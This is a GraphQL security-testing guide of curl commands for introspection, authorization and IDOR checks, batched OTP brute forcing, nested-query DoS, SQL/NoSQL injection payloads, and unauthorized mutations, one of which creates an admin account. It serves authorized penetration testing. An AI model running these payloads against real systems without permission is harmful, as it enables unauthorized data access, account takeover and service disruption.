# GraphQL Security Testing

## Objective

Identify security vulnerabilities specific to GraphQL implementations including introspection leakage, unauthorized query access, batching attacks, injection via arguments, and IDOR through object resolvers.

---

## 1. Endpoint Discovery

```bash
# Common GraphQL endpoint paths
for EP in /graphql /graphiql /api/graphql /v1/graphql /gql /query /graphql/v1; do
  echo "Testing: $EP"
  curl -si -X POST "https://target$EP" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}' | grep -E "HTTP|__typename|errors"
  sleep 0.2
done
```

---

## 2. Introspection Query

Introspection reveals the entire API schema:

```bash
# Full introspection query
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: session=USER_TOKEN" \
  -d '{
    "query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind } } } } }"
  }' | python3 -m json.tool

# Simplified — just type names
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | grep "name"
```

**If introspection is disabled**, try:
```bash
# Field suggestion (works even when introspection is disabled)
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}' | grep "Did you mean"
# "Did you mean 'user'?" reveals valid field names
```

---

## 3. Authentication Testing on Queries

### Test Without Authentication
```bash
# Test each query type without authentication
for QUERY in "users" "user(id:1)" "me" "products" "orders" "adminSettings"; do
  echo "Testing: $QUERY"
  curl -si -X POST https://target/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ $QUERY { id } }\"}" | grep -E "HTTP|errors|data"
  sleep 0.2
done
```

### Cross-Role Testing
```bash
# User token querying admin-level data
curl -si -X POST https://target/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ allUsers { id email role passwordHash } }"
  }' | grep -E "HTTP|email|role|passwordHash"
```

---

## 4. IDOR via GraphQL Object Queries

```bash
# Access another user's data via direct ID
curl -si -X POST https://target/graphql \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ user(id: \"USER_B_ID\") { id email address phone creditCards { number } } }"
  }' | grep -E "email|address|credit"
```

---

## 5. Batching Attack (Brute Force via Batching)

GraphQL allows multiple operations in one request — useful for bypassing per-request rate limits:

```bash
# Batch OTP guessing — 100 OTP attempts in 1 HTTP request
curl -si -X POST https://target/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { verifyOTP(code: \"1000\") { success token } }"},
    {"query":"mutation { verifyOTP(code: \"1001\") { success token } }"},
    {"query":"mutation { verifyOTP(code: \"1002\") { success token } }"},
    {"query":"mutation { verifyOTP(code: \"1003\") { success token } }"},
    {"query":"mutation { verifyOTP(code: \"1004\") { success token } }"}
  ]' | python3 -m json.tool
```

**Vulnerable:** If batching is allowed and each mutation is executed independently, rate limiting can be bypassed.

---

## 6. Denial of Service — Query Depth & Complexity

GraphQL allows nested queries which can cause exponential database load:

```bash
# Deep nested query (safe limit: 5 levels)
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users { friends { friends { friends { friends { id name } } } } } }"
  }' | grep -E "HTTP|error|timeout"
```

**Limit to 5 nesting levels** — do not exceed this in testing.

---

## 7. SQL/NoSQL Injection via GraphQL Arguments

```bash
# SQL injection in GraphQL argument
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(email: \"test@test.com\\\" OR 1=1 -- \") { id email } }"}' \
  | grep -E "HTTP|error|email"

# NoSQL injection
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: {\"$gt\": \"\"}) { id email } }"}' | grep HTTP
```

---

## 8. Sensitive Field Exposure

Test if resolvers expose fields that should not be returned:

```bash
# Request sensitive fields that should be restricted
curl -si -X POST https://target/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ me { id email password passwordHash secretQuestion secretAnswer mfaSecret apiKeys { key } } }"
  }' | python3 -m json.tool
```

---

## 9. Mutation Testing — Unauthorized State Changes

```bash
# Create admin user (unauthorized)
curl -si -X POST https://target/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { createUser(input: {email:\"hacked@evil.com\",role:\"admin\"}) { id role } }"
  }' | grep -E "HTTP|role|admin"

# Delete another user's content
curl -si -X POST https://target/graphql \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { deletePost(id: \"USER_B_POST_ID\") { success } }"
  }' | grep -E "HTTP|success"
```

---

## 10. GraphQL Playground / GraphiQL Exposure in Production

```bash
# Check if GraphiQL or Playground is accessible in production
curl -si https://target/graphql | grep -iE "graphiql|playground|graphQL IDE"
curl -si https://target/graphiql | grep HTTP
curl -si https://target/graphql/playground | grep HTTP
```

---

## Evidence to Capture

- Introspection response (schema dump — redact any sensitive type names in report)
- The unauthorized query and response showing restricted data
- Batching attack request + response showing rate limit bypass
- Mutation showing unauthorized state change

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Introspection enabled in production | Pass/Fail | Medium |
| Unauthenticated query access | Pass/Fail | High |
| IDOR via object ID in query | Pass/Fail | High |
| Batching bypasses rate limit | Pass/Fail | High |
| Sensitive fields exposed in queries | Pass/Fail | High |
| SQL injection in arguments | Pass/Fail | Critical |
| Playground exposed in production | Pass/Fail | Low-Medium |
